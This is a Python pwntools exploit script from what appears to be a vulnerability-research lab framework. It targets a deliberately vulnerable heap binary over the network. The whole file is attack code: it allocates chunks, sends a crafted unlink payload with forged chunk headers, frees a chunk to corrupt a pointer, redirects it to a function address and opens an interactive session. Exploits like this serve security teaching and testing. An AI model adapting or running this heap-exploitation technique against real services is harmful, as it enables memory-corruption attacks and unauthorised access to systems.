#! /usr/bin/python
#coding:utf-8
'''Heap_Overflow - Ret2libc (ALSR - on)'''
import os
import sys

sys.path.append(os.path.abspath("../.."))
from modules.script_tools import *
from modules import exploit
from pwn import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        self.name = 'heap_overflow'
        self.payload_info = 'DEP ON ASLR ON'
        self.info = '''Exploit Name : heap_overflow
                       Exploit abstract :heap overflow 
                       Author : guoyingjie
                       Support change payload : false'''
        # read options from share
        self.options = {'dIP' :  get_share('dIP'),
                   'port' : get_share('port'),
                   'wait' : get_share('wait')}
        self.property = {
            '&ptr':0x0,
            }
        self.vulnerability= 'vulnerabilities/heap/heap64static'
    def run(self):
        ip, port = self.options['dIP'], int(self.options['port'])
        p = remote(ip, port)

        #debug
        if eval(self.options['wait']):
             a= raw_input("You can attach now.\nPress Any Key to begin...")
   

        libc = ELF('../../vulnerabilities/heap/heap64static')
        self.property['&ptr'] = libc.symbols['a'] + 8*2000
        gffaddress =libc.symbols['gff']
        print hex(gffaddress)

        print p.recvline() # choice  
        p.sendline('m')
        print p.recvline() # malloc
        print p.recvline() # size
        p.sendline('504')
        print p.recvline() # content
        p.sendline('aaa')
        print p.recvline() # ok

        print p.recvline() # choice
        p.sendline('m')
        print p.recvline() # malloc
        print p.recvline() # size
        p.sendline('504')
        print p.recvline() # content
        p.sendline('aaa')
        print p.recvline() # ok



        #关键payload
        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
        payload = p64(0x0) + p64(0x1f9) + p64(self.property['&ptr'] - 0x18) + p64(self.property['&ptr'] - 0x10) + "a"*(504 - 40) + p64(0x200 - 16) + p64(0x200)
        p.sendline(payload)
        print p.recvline() # ok


        
        print p.recvline() # choice
        p.sendline('f')
        print p.recvline() # free
        p.sendline('1')
        print p.recvline() # ok


        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
        p.sendline('a'*24 + p64(gffaddress))
        print p.recvline() # ok

        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
        p.sendline('g')
        print p.recvline() # ok


        
  
        p.interactive()




if __name__=='__main__':
 
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.frame_check():
        print 'Running:\n'
        exp.run()



